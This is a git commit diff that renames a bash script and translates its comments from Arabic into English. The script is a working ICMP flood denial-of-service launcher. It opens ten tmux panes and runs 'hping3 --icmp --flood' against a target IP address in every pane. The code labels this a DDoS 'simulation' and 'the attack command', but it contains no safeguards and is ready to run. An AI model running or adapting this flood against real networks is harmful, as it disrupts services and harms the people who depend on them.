312aaa2761210248d530b17f5506ca5d873c679d
Yusuf Husayn <yusufmohammadhussein@gmail.com>
2026-07-03 01:10:32 +0300

    Update and rename scripts/Scripts_For_DDoS/bash/00-icmp-ddos_Script.sh to scripts/bash/00-icmp-ddos_Script.sh

--- scripts/bash/00-icmp-ddos_Script.sh
+++ scripts/bash/00-icmp-ddos_Script.sh
@@ -2,21 +2,21 @@
 
 SESSION_NAME="ddos_simulation"
 
-# 1. إنشاء جلسة tmux جديدة في الخلفية
+#1. Create a new tmux session in the background
 tmux new-session -d -s $SESSION_NAME
 
-# 2. إنشاء 9 تقسيمات إضافية ليصبح المجموع 10 أجزاء داخل نفس الشاشة
+# 2. Create 9 additional divisions to make a total of 10 parts within the same screen
 for i in {1..9}
 do
     tmux split-window -t $SESSION_NAME
     tmux select-layout -t $SESSION_NAME tiled
 done
 
-# 3. إرسال أمر الهجوم إلى كل جزء (Pane) تلقائياً وتنفيذه
+#3. Automatically send the attack command to each pane and execute it
 for pane in $(tmux list-panes -t $SESSION_NAME -F '#{pane_id}')
 do
     tmux send-keys -t "$pane" "sudo hping3 --icmp --flood 192.168.1.25" C-m
 done
 
-# 4. الدخول إلى الجلسة مباشرة لرؤية واجهة العمل كاملة
+# 4. Enter the session directly to see the full work interface
 tmux attach-session -t $SESSION_NAME
